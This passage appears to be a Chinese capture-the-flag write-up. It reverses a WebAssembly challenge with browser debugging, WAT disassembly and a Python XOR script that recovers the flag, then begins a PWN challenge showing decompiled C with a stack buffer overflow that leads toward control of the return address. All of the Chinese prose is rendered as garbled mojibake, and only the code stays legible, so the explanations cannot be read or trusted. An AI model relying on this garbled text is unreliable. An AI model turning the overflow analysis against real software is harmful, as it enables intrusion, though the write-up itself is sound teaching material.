<p>ä¸è¿‡å¯¹äºé€†å‘è¿™ä¸€æ–¹é¢ï¼ŒWASM æ˜¯ä¸€ç§å¾ˆéš¾çœ‹æ‡‚çš„ä¸œè¥¿ï¼Œå·¥å…·çš„é™æ€åˆ†ææ•ˆæœä¸ç†æƒ³ï¼Œè€ŒåŠ¨æ€è°ƒè¯•åªèƒ½ä½¿ç”¨æµè§ˆå™¨çš„æ§åˆ¶å°ã€‚<br>WebAssembly æœ¬è´¨æ˜¯ä¸€ä¸ªåŸºäºæ ˆçš„è™šæ‹Ÿæœºï¼Œæ‰€æœ‰çš„æ“ä½œæŒ‡ä»¤(é’ˆå¯¹æ“ä½œæ•°çš„)éƒ½å¯ä»¥è¢«ç®€åŒ–æˆ <strong>ä»æ ˆä¸Šå–å€¼ â€“&gt; è¿›è¡Œè¿ç®— â€“&gt; å­˜å›æ ˆä¸Š</strong>ï¼Œä½†å®é™…ä¸Šåœ¨è°ƒè¯•é¢˜ç›®çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ‰€é¢å¯¹çš„åªæœ‰ä¸€å †æŒ‡ä»¤å’Œå±€éƒ¨&#x2F;å…¨å±€å˜é‡ã€‚  </p>
<p>æ‰“å¼€æµè§ˆå™¨ï¼ŒæŠŠ hello.html æ‹–åˆ°æµè§ˆå™¨ä¸­ï¼Œä¼šç›´æ¥æ‰“å¼€é¢˜ç›®é¡µé¢å¹¶å¼¹å‡ºä¸€ä¸ª Input çª—å£:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online8.png"
                      alt="image"
                ></p>
<p>flag å°±è¦è¾“å…¥åˆ°è¿™ä¸ªçª—å£ä¸­ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä»»æ„è¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼Œç‚¹å‡»ç¡®å®šæŒ‰é’®ä¹‹åå®ƒå¹¶ä¸ä¼šæ¶ˆå¤±ï¼Œå°±ç®—è¾“å…¥äº†æ­£ç¡®çš„ flagï¼Œè¿™ä¸ªçª—å£ä¹Ÿä¼šä¸€ç›´å­˜åœ¨ï¼Œç‚¹å‡»å–æ¶ˆæŒ‰é’®çª—å£æ‰ä¼šæ¶ˆå¤±ï¼Œæˆ‘ä»¬ç›´æ¥æŒ‰ä¸‹F12å¼€å¯æ§åˆ¶å°ï¼Œåœ¨è°ƒè¯•å™¨ä¸€æ ä¸­èƒ½å¤Ÿæ‰¾åˆ° wasm:&#x2F;&#x2F; è¿™ä¸ªç›®å½•ï¼Œæ‰“å¼€å®ƒå¹¶åŒå‡»å­ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œç„¶ååˆ·æ–°é¡µé¢ï¼Œå°±èƒ½çœ‹åˆ° wasm çš„åæ±‡ç¼–ä»£ç äº†ï¼Œå¦‚æœä¸å°å¿ƒè¯¯æ“ä½œï¼Œåˆ·æ–°é¡µé¢é‡ç½®ç¨‹åºï¼Œç‚¹å‡»ä»£ç ä¹‹å‰çš„è¡Œå·å¯ä»¥ä¸‹æ–­ç‚¹ï¼ŒF10æ˜¯å•æ­¥æ­¥è¿‡ï¼ŒF11æ˜¯å•æ­¥æ­¥å…¥ã€‚<br>æˆ‘ä»¬ç›´æ¥åˆ‡å…¥æ­£é¢˜ï¼Œè¦æƒ³è°ƒè¯• wasmï¼Œé¦–å…ˆè¦åœ¨ JS&#x2F;html ä¸­å®šä½ â€œé©±åŠ¨å‡½æ•°â€ï¼Œè§‚å¯Ÿ html ä»£ç æ²¡æœ‰æ‰¾åˆ°è°ƒç”¨å‡½æ•°çš„ä½ç½®ï¼Œé‚£å°±å» js é‡Œé¢æ‰¾ä¸€æ‰¾ï¼Œç›´æ¥æœç´¢å­—ç¬¦ä¸² â€œInput:â€ æ¥å®šä½å‡½æ•°ä½ç½®ã€‚<br>æ‰¾åˆ°ä»¥ä¸‹ä»£ç ï¼š</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">window</span> != <span class="string">&#x27;undefined&#x27;</span> &amp;&amp;</span><br><span class="line">          <span class="keyword">typeof</span> <span class="variable language_">window</span>.<span class="property">prompt</span> == <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">          <span class="comment">// Browser.</span></span><br><span class="line">          result = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Input: &#x27;</span>);  <span class="comment">// returns null on cancel</span></span><br><span class="line">          <span class="keyword">if</span> (result !== <span class="literal">null</span>) &#123;</span><br><span class="line">            result += <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure></div>
<p>è™½ç„¶æ‰¾åˆ°äº†å…³é”®ä»£ç çš„ä½ç½®ï¼Œä½†æ˜¯ä¸Šä¸‹ç¿»æ‰¾å¹¶æ²¡æœ‰å‘ç°å“ªé‡Œè°ƒç”¨äº† wasm ä¸­çš„å‡½æ•°ï¼Œä¸‹æ–­ç‚¹è·Ÿè¸ªçœ‹çœ‹ä¹Ÿæ²¡ä»€ä¹ˆç»“æœï¼Œçº¿ç´¢åˆ°è¿™é‡Œä¼¼ä¹æ–­æ‰äº†ï¼ŒæŸ¥çœ‹äº† wp ä¹‹åæ‰å‘ç°ï¼Œåœ¨ wasm æ–‡ä»¶ä¸­å­˜åœ¨ä¸€ä¸ªåä¸º _main çš„å‡½æ•°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(export &quot;_main&quot; (func $func24))</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªåº”è¯¥å°±æ˜¯ä¸»å‡½æ•°äº†ï¼Œæ³¨æ„åœ¨ wasm ä¸­å‡½æ•°åä¸å†æ˜¯æ˜æ–‡æ ‡æ³¨ï¼Œè€Œæ˜¯ä½¿ç”¨å½¢å¦‚ funcxx çš„æ ¼å¼ï¼Œé‚£ä¹ˆä¸»å‡½æ•°å°±æ˜¯ func24ï¼Œç›´æ¥æœç´¢ func24 å®šä½åˆ°ä¸»å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œåˆ·æ–°é¡µé¢ï¼Œæœç„¶æ–­ä¸‹æ¥ã€‚<br>æ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹å•æ­¥è°ƒè¯•äº†ï¼Œä¸»å‡½æ•°çš„ä»£ç å¹¶ä¸å¤æ‚ï¼Œè¿™ç§ä»£ç çœ‹èµ·æ¥ç”šè‡³è¦æ¯”çœŸæ­£çš„æ±‡ç¼–ç®€å•</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(func $func24 (result i32)</span><br><span class="line">  (local $var0 i32) (local $var1 i32) (local $var2 i32) (local $var3 i32) (local $var4 i32) (local $var5 i32) (local $var6 i32) (local $var7 i32) (local $var8 i32) (local $var9 i32) (local $var10 i32) (local $var11 i32) (local $var12 i32)</span><br><span class="line">  get_global $global10</span><br><span class="line">  set_local $var12</span><br><span class="line">  get_global $global10</span><br><span class="line">  i32.const 256</span><br><span class="line">  i32.add</span><br><span class="line">  set_global $global10</span><br><span class="line">  get_global $global10</span><br><span class="line">  get_global $global11</span><br><span class="line">  i32.ge_s</span><br><span class="line">  if</span><br><span class="line">    i32.const 256</span><br><span class="line">    call $import3</span><br><span class="line">  end</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 240</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var10</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 232</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var9</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 224</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var8</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 216</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var7</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 112</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var1</span><br><span class="line">  get_local $var12</span><br><span class="line">  set_local $var2</span><br><span class="line">  i32.const 0</span><br><span class="line">  set_local $var0</span><br><span class="line">  i32.const 4447</span><br><span class="line">  get_local $var7</span><br><span class="line">  call $func97</span><br><span class="line">  drop</span><br><span class="line">  get_local $var8</span><br><span class="line">  get_local $var1</span><br><span class="line">  i32.store</span><br><span class="line">  i32.const 4472</span><br><span class="line">  get_local $var8</span><br><span class="line">  call $func98</span><br><span class="line">  drop</span><br><span class="line">  get_local $var1</span><br><span class="line">  call $func42</span><br><span class="line">  set_local $var3</span><br><span class="line">  i32.const 4475</span><br><span class="line">  i32.const 8</span><br><span class="line">  get_local $var1</span><br><span class="line">  get_local $var3</span><br><span class="line">  get_local $var2</span><br><span class="line">  call $func22</span><br><span class="line">  drop</span><br><span class="line">  get_local $var2</span><br><span class="line">  call $func23</span><br><span class="line">  set_local $var4</span><br><span class="line">  get_local $var4</span><br><span class="line">  i32.const 24</span><br><span class="line">  i32.shl</span><br><span class="line">  i32.const 24</span><br><span class="line">  i32.shr_s</span><br><span class="line">  i32.const 0</span><br><span class="line">  i32.ne</span><br><span class="line">  set_local $var5</span><br><span class="line">  get_local $var5</span><br><span class="line">  if</span><br><span class="line">    i32.const 4484</span><br><span class="line">    get_local $var9</span><br><span class="line">    call $func97</span><br><span class="line">    drop</span><br><span class="line">    get_local $var0</span><br><span class="line">    set_local $var6</span><br><span class="line">    get_local $var12</span><br><span class="line">    set_global $global10</span><br><span class="line">    get_local $var6</span><br><span class="line">    return</span><br><span class="line">  else</span><br><span class="line">    i32.const 4488</span><br><span class="line">    get_local $var10</span><br><span class="line">    call $func97</span><br><span class="line">    drop</span><br><span class="line">    get_local $var0</span><br><span class="line">    set_local $var6</span><br><span class="line">    get_local $var12</span><br><span class="line">    set_global $global10</span><br><span class="line">    get_local $var6</span><br><span class="line">    return</span><br><span class="line">  end</span><br><span class="line">  unreachable</span><br><span class="line">  i32.const 0</span><br><span class="line">  return</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
<p>è¿™é“é¢˜æ•´ä¸ªè°ƒè¯•è¿‡ç¨‹æ¶‰åŠåˆ°çš„æŒ‡ä»¤ç¿»æ¥è¦†å»åªæœ‰é‚£ä¹ˆå‡ ä¸ªï¼Œæ¯”å¦‚ set_local å’Œ get_localï¼Œç›¸å½“äºæ±‡ç¼–ä¸­çš„ mov ï¼Œi32.const 0ï¼Œç›¸å½“äºæå‡ºäº†ä¸€ä¸ªç«‹å³æ•°ï¼Œcall è‡ªç„¶æ˜¯è°ƒç”¨å‡½æ•°çš„æ„æ€ï¼Œæ›´è¯¦ç»†çš„æŒ‡ä»¤è§£é‡Šåœ¨<a class="link"   href="https://ithelp.ithome.com.tw/articles/10195837" >è¿™é‡Œ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚<br>å•æ­¥è°ƒè¯•ï¼Œå‰é¢çš„ set&#x2F;get æ‰§è¡Œäº†ä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œç¬¬ä¸€ä¸ªé‡åˆ°çš„å‡½æ•°æ˜¯ $func97ï¼Œæ­¥è¿‡å®ƒæ²¡æœ‰ä»€ä¹ˆå½±å“ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯ $func98ï¼Œå•æ­¥æ­¥è¿‡ä¹‹åå°±ä¼šå¼¹å‡º Input æç¤ºæ¡†ï¼Œé‚£ä¹ˆè¿™é“é¢˜ç›®çš„å…¥å£ç‚¹å¯èƒ½æ˜¯åœ¨ wasm ä¸­ï¼Œç”± wasm å…ˆæ‰§è¡Œä¸€éƒ¨åˆ†ä»£ç ï¼Œç„¶åå°†æ§åˆ¶æƒè½¬äº¤ç»™ JS ï¼ŒJS è·å–ç”¨æˆ·è¾“å…¥ï¼Œç„¶åå†äº¤æ¢æ§åˆ¶æƒç»™ wasmã€‚<br>åœ¨æç¤ºæ¡†ä¸­è¾“å…¥ä¸€äº›å†…å®¹ï¼Œç‚¹å‡»ç¡®å®šå†ç‚¹å‡»å–æ¶ˆï¼Œç¨‹åºä¼šæ–­åœ¨ func98 çš„ä¸‹ä¸€è¡Œã€‚<br>æ¥ä¸‹æ¥æ˜¯ func42ï¼Œè¿™ä¸ªå‡½æ•°æ­¥å…¥åˆ†æä¸€ä¸‹ï¼Œå¤§è‡´çœ‹ä¸€ä¸‹å†…éƒ¨ç»“æ„æœ‰å‡ ä¸ªå¾ªç¯ï¼ŒæŸ¥çœ‹å‡½æ•°çš„è¿”å›å€¼æ—¶å‘ç°æ­£å¥½æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œæ¯”å¦‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online9.png"
                      alt="image"
                ></p>
<p>é‚£ä¹ˆå®ƒåº”è¯¥å°±æ˜¯ strlen ä¹‹ç±»çš„æ±‚å­—ç¬¦ä¸²é•¿åº¦çš„å‡½æ•°ï¼Œç›´æ¥æ­¥è¿‡ï¼Œç´§æ¥ç€è¿›å…¥åˆ°æœ¬é¢˜çš„å…³é”®å‡½æ•°ï¼Œfunc22ã€‚<br>é¦–å…ˆå¯ä»¥çœ‹åˆ°å‡½æ•°çš„å‡ ä¸ªå‚æ•°<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online10.png"
                      alt="image"
                ><br>å¦‚æœè¿™æ ·çœ‹ä¸å¤Ÿæ˜æ˜¾çš„è¯ï¼Œå¯ä»¥æœç´¢ func22 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(func $func22 (param $var0 i32) (param $var1 i32) (param $var2 i32) (param $var3 i32) (param $var4 i32) (result i32)</span><br></pre></td></tr></table></figure></div>
<p>å¾ˆæ˜æ˜¾çš„çœ‹åˆ°å‡½æ•°æ¥æ”¶ 5 ä¸ªå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªå€¼ã€‚<br>é€šè¿‡ call ä¸Šæ–¹çš„äº”ä¸ªå–å€¼è¯­å¥ï¼Œå®¹æ˜“åˆ†æå‡ºå®ƒä»¬éƒ½æ˜¯ä»€ä¹ˆï¼Œ4475 å±äº wasm çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬ä¾æ¬¡ç‚¹å‡»å³è¾¹çš„ <strong>Window:Global â€“&gt; HEAPU8:Uint8Array</strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online11.png"
                      alt="image"
                ></p>
<p>è¿™é‡Œä¼šåˆ—å‡ºå¾ˆå¤šçš„åŒºé—´ï¼Œåœ¨é‡Œé¢æ‰¾åˆ° 4475ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online12.png"
                      alt="image"
                ></p>
<p>å°†è¿™å‡ ä¸ªåè¿›åˆ¶æ•°è½¬æ¢æˆå­—ç¬¦å¾—åˆ°ï¼šâ€<strong>I_am_key</strong>â€œ ï¼ŒçŒœæµ‹è¿™å°±æ˜¯åŠ å¯†ç®—æ³•çš„ç§˜é’¥ï¼Œä¹‹å‰çš„ 8 ä¹Ÿå°±æ˜¯ç§˜é’¥çš„é•¿åº¦ï¼Œç±»ä¼¼çš„ï¼Œåˆ†æå‡ºåä¸‰ä¸ªå‚æ•°æ˜¯ flag ã€flag çš„é•¿åº¦ã€ä¸€ä¸ªç©ºçš„æ•°ç»„ã€‚<br>æ­¥å…¥ func22ï¼Œå•æ­¥åˆ†æè¿™ä¸ªå‡½æ•°ï¼Œç»å¤§éƒ¨åˆ†çš„æ“ä½œéƒ½æ˜¯å–å€¼â€“è¿ç®—â€“ä¿å­˜ç»“æœï¼ŒçœŸæ­£ä¸€æ­¥è¿ç®—æ˜¯ä¸€ä¸ªå¼‚æˆ–ï¼Œå…¶ä»–çš„éƒ½æ˜¯æ›¿æ¢ä¸€äº›æ•°æ®çš„ä½ç½®ç­‰ç­‰ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online13.png"
                      alt="image"
                ></p>
<p>ç›´æ¥åœ¨è¿™ä¸ªå¼‚æˆ–ä¸‹æ–­ç‚¹ï¼Œè¾“å…¥çš„ flag åœ¨ var39ï¼Œç¨‹åºå†…ç½®çš„æ•°æ®åœ¨ var33ï¼Œä¸¤è€…å¼‚æˆ–ç„¶åä¿å­˜åˆ°å †æ ˆä¸­ã€‚<br>å½“è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åï¼Œå›åˆ°ä¸»å‡½æ•°ï¼Œä¸‹é¢è¿˜æœ‰æœ€åä¸€ä¸ªé‡è¦å‡½æ•° func23ï¼ŒåŒæ ·çš„ï¼Œé€šè¿‡å•æ­¥è°ƒè¯•å‘ç°æ˜¯æ¯”è¾ƒå‡½æ•°ï¼Œå…³é”®ç‚¹åœ¨äº</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set_local $var7</span><br><span class="line">get_local $var3</span><br><span class="line">get_local $var7</span><br><span class="line">i32.ne</span><br><span class="line">set_local $var8</span><br><span class="line">get_local $var8</span><br></pre></td></tr></table></figure></div>
<p>å°†åŠ å¯†å¥½çš„ flag å’Œå†…ç½®çš„æ•°æ®è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå®Œå…¨åŒ¹é…å°±æˆåŠŸã€‚<br>ç®€å•çš„ç ´è§£æ€è·¯æ˜¯åœ¨ func22 é‡Œé¢æŠŠå’Œ flag å¼‚æˆ–çš„æ•°ç»„å–å‡ºæ¥ï¼Œç„¶ååœ¨ func23 ä¸­å–å‡ºç›®æ ‡æ•°ç»„ï¼Œä¸¤è€…å¼‚æˆ–å³å¯å¾—åˆ°æ­£ç¡®çš„ flagã€‚<br>ä½†æ˜¯ç”±äºè°ƒè¯•å™¨çš„é—®é¢˜ï¼Œæˆ‘ä¸€ç›´ä¸èƒ½æ­£å¸¸æ–­åœ¨ç†æƒ³çš„ä½ç½®ï¼Œäºæ˜¯é€€è€Œæ±‚å…¶æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€ä¸²ç›¸åŒçš„å­—ç¬¦ï¼Œæ¯”å¦‚ä¸€ä¸² 0ï¼Œç„¶åç›´æ¥åœ¨ func23 é‡Œé¢å–å‡ºç›®æ ‡æ•°ç»„å’ŒåŠ å¯†ä¹‹åçš„æ•°ç»„ï¼Œå°†åŠ å¯†ä¹‹åçš„æ•°ç»„å…ˆé€ä½å¼‚æˆ–å­—ç¬¦ 0ï¼Œå†å’Œç›®æ ‡æ•°ç»„å¼‚æˆ–å³å¯ã€‚<br>é™„ä¸Šè§£å¯†è„šæœ¬</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s_t = [<span class="number">137</span>, <span class="number">221</span>, <span class="number">46</span>, <span class="number">119</span>, <span class="number">76</span>, <span class="number">156</span>, <span class="number">92</span>, <span class="number">92</span>, <span class="number">137</span>, <span class="number">215</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">132</span>, <span class="number">233</span>, <span class="number">53</span>, <span class="number">206</span>, <span class="number">231</span>]</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s_t:</span><br><span class="line">    s.append(i ^ <span class="number">48</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">target = [<span class="number">223</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">32</span>, <span class="number">7</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">201</span>, <span class="number">158</span>, <span class="number">142</span>, <span class="number">23</span>, <span class="number">215</span>, <span class="number">237</span>, <span class="number">120</span>, <span class="number">121</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> k &lt; <span class="built_in">len</span>(target) - <span class="number">1</span>:</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[k] ^ target[k])</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<p>flag : flag{happy_rc4}</p>
<p>åŸæ¥æ˜¯ rc4 ç®—æ³•ï¼Œå…¶å®åœ¨ä»£ç ä¸­ä¹Ÿèƒ½çœ‹è§ä¸€äº›ç«¯å€ªã€‚<br>å®é™…ä¸Š webassembly ç¼–è¯‘å‡ºæ¥çš„ wasm æ–‡ä»¶å’Œä¸€èˆ¬çš„äºŒè¿›åˆ¶ç±»ä¼¼ï¼ŒæŒ‡ä»¤æ‰€å®ç°çš„åŠŸèƒ½ä¹Ÿå¤§åŒå°å¼‚ï¼Œç”šè‡³ä»æŸç§æ„ä¹‰ä¸Šè®²ï¼Œwasm åæ±‡ç¼–ä»£ç è¦æ›´åŠ ç®€å•ä¸€äº›ï¼Œä½†æ˜¯è‹¦äºæ²¡æœ‰è¾ƒå¥½çš„å·¥å…·ï¼Œé€†å‘èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒå¤´ç—›çš„ã€‚</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="1-Regex-Format"><a href="#1-Regex-Format" class="headerlink" title="1. Regex Format"></a>1. Regex Format</h3><p>é¢˜ç›®æ¨¡æ‹Ÿäº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¼•æ“ï¼Œè¾“å…¥è‡ªå®šä¹‰çš„æ­£åˆ™è¡¨è¾¾å¼å’Œå¾…åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œç¨‹åºè¿”å›æ­£åˆ™åŒ¹é…çš„ç»“æœã€‚<br>å…ˆä¸å»é€†å‘é€»è¾‘ï¼Œæœç´¢å­—ç¬¦ä¸²å‘ç° â€œBefore :use$ it, :understand$* it :first$+.â€ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å‡ºé¢˜äººç»™å‡ºçš„æ ·ä¾‹æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿è¡Œç¨‹åºï¼Œä¸è¾“å…¥ä»»ä½•æ–°çš„è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²è®¾ç½®ä¸º â€œBefore use it, understand it first.â€ï¼Œå³å¯åŒ¹é…æˆåŠŸï¼Œè¿”å› â€œBefore u it, understand it first.â€ã€‚<br>ç»“åˆçœŸå®çš„æ­£åˆ™è¡¨è¾¾å¼çŒœæµ‹ å†’å· å’Œ ç¾å…ƒç¬¦å· æ ‡è¯†äº†åŒ¹é…çš„èŒƒå›´ï¼Œ æ˜Ÿå· è¡¨ç¤ºåŒ¹é…é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œ åŠ å· è¡¨ç¤ºåŒ¹é…è‡³å°‘ä¸€æ¬¡ã€‚<br>ä¹‹ååˆ†æç¨‹åºçš„é€»è¾‘ï¼Œå…³é”®ç‚¹åœ¨ä¸‹é¢è¿™æ®µä»£ç ä¸­</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v34; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v12 = &amp;s;</span><br><span class="line">  v11 = &amp;unk_804A634 + <span class="number">100</span> * i;</span><br><span class="line">  v10 = v32;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v32 = sub_8048930(v11, &amp;v10[v2], v12);</span><br><span class="line">  <span class="keyword">if</span> ( v32 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dest = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strcat</span>(&amp;dest, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>åŒ¹é…å‡½æ•°å°±æ˜¯ sub_8048930ï¼Œä¼ é€’çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ä¸€å—ç©ºé—²å†…å­˜ï¼Œè¾“å…¥çš„å¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ ˆå†…å­˜ã€‚è€Œæ¼æ´å°±å‡ºåœ¨è¿™ä¸ª v12 ä¸Šé¢ã€‚<br>è¿›å…¥åŒ¹é…å‡½æ•°åˆ†æé€»è¾‘ï¼Œç»“æœå’Œæˆ‘ä»¬çš„çŒœæµ‹ç›¸åŒ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *__cdecl <span class="title function_">sub_8048930</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">char</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [esp+1Fh] [ebp-29h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-24h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// [esp+28h] [ebp-20h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v8; <span class="comment">// [esp+2Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> v9; <span class="comment">// [esp+30h] [ebp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// [esp+40h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;:&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v9 - <span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        v8 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">1000</span>;</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">1000</span>;</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i &lt; v8 )</span><br><span class="line">        v4 = sub_80488B0(a1, a2[i]) != <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      a3[i] = a2[i];    <span class="comment">// æ¼æ´ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    a3[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt; v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[!]No match string\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = a2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strstr</span>(a2, a1);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = v5;</span><br><span class="line">      <span class="built_in">strcpy</span>(a3, a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[!]No match string\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>æ³¨æ„ä»£ç ä¸­åŒ¹é…å®Œæˆåï¼Œä¼šå°è¯•å°†åŒ¹é…çš„ç»“æœæ”¾å…¥æ ˆä¸Šï¼Œç”±äºæ ˆä¸Šçš„å˜é‡ v12 é•¿åº¦åªæœ‰ 200ï¼Œè€Œæˆ‘ä»¬å¯ä»¥è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º 1000ï¼Œä¼šå¯¼è‡´æ ˆæº¢å‡ºï¼Œæ§åˆ¶è¿”å›åœ°å€ï¼Œä¹‹åå°±æ˜¯æ‹¿ shell äº†ã€‚<br>å…ˆçœ‹ä¸€ä¸‹ç¨‹åºå¼€å¯çš„ä¿æŠ¤<br><img  
                     lazyload
                     src="/images/loading.svg"
